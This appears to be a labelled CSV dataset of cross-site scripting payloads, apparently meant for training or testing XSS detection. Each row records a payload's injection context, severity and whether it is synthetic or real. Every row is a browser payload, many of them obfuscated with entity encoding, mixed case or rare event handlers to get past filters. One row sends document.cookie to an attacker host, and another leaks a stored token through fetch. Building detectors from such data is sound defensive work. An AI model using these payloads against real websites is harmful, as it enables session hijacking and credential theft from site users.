payload,context,technique,severity,length,source
"onbeforecopy=\u0061lert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,54,synthetic
<obj&#101;ct x=y onw&#101;bkit&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,94,synthetic
"%22><iframe ontouchstart=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,63,synthetic
"<style>:target {color:red;}</style><hr id=x style=""transition:color 1s"" ontransitionend=alert(1)></hr>",tag_injection,none,medium,102,real
<obJecT	oNmoZfuLlsCreEncHanGe=ConSolE.lOg(1)>,tag_injection,synthetic,medium,45,synthetic
""" ><svg on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,54,synthetic
%3Ca onsearch=alert(1)/%3E,tag_injection,synthetic,medium,26,synthetic
<video onclick=console.log(%27XSS%27) onclick=console.log(%27XSS%27)>,tag_injection,synthetic,medium,69,synthetic
%3Carea x=y onpageshow=prompt('XSS')%3E,tag_injection,synthetic,medium,39,synthetic
"setTimeout(""\u0061lert(document.domain)"",0)",dom_sink,synthetic,low,43,synthetic
<!--><b&#97;s&#101; ong&#101;stur&#101;&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,91,synthetic
<optgroup id=x tabindex=1 onactivate=alert(1)></optgroup>,tag_injection,none,medium,57,real
"<div draggable=""true"" contenteditable>drag me</div><rp ondragover=alert(1) contenteditable style=display:block>drop here</rp>",tag_injection,none,medium,125,real
"<style>@keyframes slidein {}</style><nav style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nav>",tag_injection,none,medium,160,real
%3Ctd/onmozfullscreenchange=console.log(location.hash)%3E,tag_injection,synthetic,medium,57,synthetic
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=fetch(localStorage.getItem(%27token%27))>%22)",dom_sink,synthetic,high,110,synthetic
<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>,tag_injection,none,medium,60,real
' ><svg onpoint&#101;rov&#101;r=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,63,synthetic
' %3E%3Csvg onclose=console.log(location.hash)%3E,attribute_escape,synthetic,medium,49,synthetic
onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt('XSS'),event_handler,synthetic,low,58,synthetic
"<center onmouseup=""alert(1)"">AnonKryptiQuz</center>",tag_injection,none,medium,51,real
${prompt('XSS')|n},template_injection,synthetic,medium,18,synthetic
<s onpointerout=alert(1) style=display:block>AnonKryptiQuz</s>,tag_injection,none,medium,62,real
<tiTle srC=x onBluR=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,47,synthetic
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""coNfiRm(NavIgaTor.seNdBEacOn('//AttAckEr.Com',dOcuMenT.cOokIe))""",dom_sink,synthetic,high,107,synthetic
"	onAuxCliCk=ProMpt(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,49,synthetic
"?getURL,javascript:alert(1)"",",js_uri,none,medium,29,real
'><img src=x ong&#101;stur&#101;&#101;nd=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,72,synthetic
"<baSe OntOucHmoVe=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,61,synthetic
`><Img srC=x onErrOr=ConSolE.lOg(LocAtiOn.HasH)>,attribute_escape,synthetic,medium,48,synthetic
" onscrollsn&#97;pch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,80,synthetic
%22><img src=x onpagehide=alert(location.hash)>,attribute_escape,synthetic,medium,47,synthetic
onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,69,synthetic
%27 onwebkitfullscreenchange=prompt(%27XSS%27) %27,attribute_escape,synthetic,medium,50,synthetic
"<style>:target {color:red;}</style><meter id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></meter>",tag_injection,none,medium,114,real
""" ><svg onb&#101;for&#101;cut=confirm(1)>",attribute_escape,synthetic,medium,41,synthetic
"'><img src=x onst&#97;ll&#101;d=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,89,synthetic
<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>,tag_injection,none,medium,60,real
